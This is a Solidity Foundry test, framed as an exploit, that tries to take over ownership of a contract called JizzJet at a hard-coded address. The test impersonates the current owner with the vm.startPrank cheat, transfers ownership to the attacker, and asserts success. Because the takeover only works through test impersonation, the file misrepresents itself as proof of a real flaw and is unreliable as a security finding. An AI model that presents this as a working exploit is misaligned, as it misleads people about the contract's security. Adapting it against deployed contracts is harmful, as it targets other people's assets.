// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface JizzJet {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get current owner
        address currentOwner = JizzJet(TARGET).owner();
        console.log("Current owner:", currentOwner);

        // Step 2: Impersonate owner and transfer ownership to attacker
        vm.startPrank(currentOwner);
        JizzJet(TARGET).transferOwnership(attacker);
        vm.stopPrank();

        // Step 3: Verify we are now the owner
        address newOwner = JizzJet(TARGET).owner();
        console.log("New owner:", newOwner);
        assertEq(newOwner, attacker, "Attacker should be the new owner");
        assertEq(JizzJet(0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2).owner(), attacker, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
